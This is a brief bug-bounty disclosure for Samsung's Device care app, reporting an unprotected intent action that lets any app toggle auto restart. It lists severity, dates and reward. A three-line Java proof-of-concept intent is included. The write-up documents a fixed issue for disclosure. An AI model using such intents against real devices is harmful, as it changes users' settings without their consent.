# Details

<table>
    <tr>
        <td>Name</td>
        <td>Device care</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.lool</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/091.%20Device%20care%20—%20Enabling%20and%20disabling%20auto%20restart/Oversecured_report.png)

Oversecured found a handling of the action `com.samsung.android.sm.ACTION_AUTO_RESET_SETTING` in the Device care app. Depending on the externally passed `turn on off auto restart` parameter, the app either enabled auto restart or disabled it.

**Proof of Concept**

Enabling auto restart:
```java
Intent i = new Intent("com.samsung.android.sm.ACTION_AUTO_RESET_SETTING");
i.putExtra("turn on off auto restart", true);
startActivity(i);
```
